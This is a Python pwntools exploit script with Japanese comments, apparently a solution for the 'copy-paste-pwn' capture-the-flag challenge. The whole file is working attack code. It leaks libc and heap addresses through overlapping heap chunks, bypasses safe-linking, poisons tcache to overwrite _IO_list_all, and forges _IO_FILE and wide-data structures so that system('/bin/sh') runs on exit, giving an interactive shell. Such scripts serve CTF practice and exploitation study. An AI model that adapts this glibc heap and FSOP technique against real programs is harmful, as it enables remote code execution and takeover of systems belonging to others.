from pwn import *

e = ELF('./chall_patched')
l = ELF('./libc.so.6')

context.binary = e 
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([e.path], gdbscript=gs)
    elif args.REMOTE:
        return remote('copy-paste-pwn.wanictf.org', 9009)  
    else:
        return process([e.path])

io = start()

def create(idx :int, size :hex, data: bytes):
    io.sendlineafter(b'your choice: ', b'1')
    io.sendlineafter(b'index: ', str(idx).encode())
    io.sendlineafter(b'size (0-4096): ', str(size).encode())
    io.sendafter(b'Enter your content: ', data.ljust(size, b'\0'))

def show(idx :int):
    io.sendlineafter(b'your choice: ', b'2')
    io.sendlineafter(b'index: ', str(idx).encode())
    return io.recvline()

def copy(idx :int):
    io.sendlineafter(b'your choice: ', b'3')
    io.sendlineafter(b'index: ', str(idx).encode())

def paste(idx :int):
    io.sendlineafter(b'your choice: ', b'4')
    io.sendlineafter(b'index: ', str(idx).encode())

def delete(idx: int):
    io.sendlineafter(b'your choice: ', b'5')
    io.sendlineafter(b'index: ', str(idx).encode())

def ex():
    io.sendlineafter(b'your choice: ', b'6')

create(0, 0x30 - 8, b'')            # A
create(1, 0x420 - 8, b'')           # B
create(2, 0x20 - 8, b'')            # C
create(3, 0x500 - 8, b'')           # D     
create(4, 0xc, b'e' * 0xc)          # E
create(5, 0xc, b'f' * 0xc)          # F
create(6, 0x10, b'g' * 0x10)        # G
create(7, 0x18, b'h' * 0x18)        # H
create(8, 0x440 - 8, b'')           # I
create(9, 0x400, b'j' * 0x400)      # J
create(10, 0x18, b'k' * 0x18)       # K
create(11, 0x20 - 8, b'')           # L
create(12, 0x20 - 8, b'')           # M

# 1: libc base leak
# Bをfreeしてunsorted binに入れる。
delete(1)

# DのPREV_INUSEを0にする。
delete(2)
copy(5)
paste(4) # index4がCになる。この時Eがfreeされる。

# Dのprev_sizeを0x440にする。
delete(4)
create(2, 0x20 - 8, b'a' * 0x10 + pack(0x440))

# Bのsizeを0x441にする。
delete(0)
copy(7)
paste(6) # index6がAになる。この時chunkGがfreeされる。

# Dをfree
delete(3)

# libc base leak
create(1, 0x420 - 8, b'')
libc_base = unpack(show(2)[:8]) - 0x219ce0
l.address = libc_base
log.info('libc_base = %#016lx'%(libc_base))

# 2: FSOP
# tcahce(0x20): G -> E
create(6, 0x10, b'g' * 0x10)
create(4, 0xc, b'e' * 0xc)
# tcahce(0x20):

create(13, 0x30 - 8, b'') # chunkCから切り出される。
delete(13)
# tcahce(0x30): C

# leak chunkC.fd to bypass safe-linking
shr12_chunkC = unpack(show(2)[:8])
heap_base    = (shr12_chunkC << 12)
log.info('(&C.fd >>12) = %#016lx'%(shr12_chunkC))
log.info('heap_base = %#016lx'%(heap_base))

# chunkIの位置に_IO_FILE_plus構造体を用意する
delete(8)
system = l.sym['system']
wfile_jumps = l.sym['_IO_wfile_jumps']
chunkI = heap_base + 0xc90

# fake _IO_FILE_plus struct
fake_file = b'  /bin/sh\0' # _flags
fake_file = fake_file.ljust(0xa0, b'\0')
fake_file += pack(chunkI + 0xe0) # _wide_data
fake_file = fake_file.ljust(0xc0, b'\0')
fake_file += p32(1) # _mode
fake_file = fake_file.ljust(0xd8, b'\0')
fake_file += pack(wfile_jumps) # vtable

# fake _IO_wide_data & _IO_jump_t struct
fake_wide_data = pack(0) * 4
fake_wide_data += pack(1) # _IO_write_ptr
fake_wide_data = fake_wide_data.ljust(0x8 * 13, b'\0')
fake_wide_data += pack(system) # __doallocate
fake_wide_data = fake_wide_data.ljust(0xe0, b'\0')
fake_wide_data += pack(chunkI + 0xe0)

create(8, 0x440 - 8, fake_file + fake_wide_data)

delete(11)
# tcahce(0x20): L
# tcache(0x30): C

# chunkCのsizeを0x20に書き変える。
delete(1)
copy(10)
paste(9) # index9がBになる。この時Jがfreeされる。

delete(2)
# tcahce(0x20): C -> L
# tcache(0x30): C -> L

# tcache-poisoning
io_list_all = l.sym['_IO_list_all']
log.info('&_IO_list_all = %#016lx'%(io_list_all))
create(2, 0x30 - 8, pack(io_list_all ^ shr12_chunkC))
# tcache(0x20): C -> &_IO_list_all
# tcahce(0x30): L

delete(4)
# tcache(0x20): E -> C -> &_IO_list_all

log.info('&chunkI.fd = %#016lx'%(chunkI))
log.info('lower 3byte: %#016lx'%(unpack(pack(chunkI)[:3].ljust(8, b'\0'))))
create(4, 0x4, pack(chunkI)[:3])
# tcache(0x20): C -> &_IO_list_all
log.info('upper 3byte: %#016lx'%(unpack(pack(chunkI)[3:6].ljust(8, b'\0'))))
create(2, 0x4, pack(chunkI)[3:6])
# tcache(0x20): &_IO_list_all

copy(2)
paste(4)
# tcache(0x20):

ex()

io.interactive()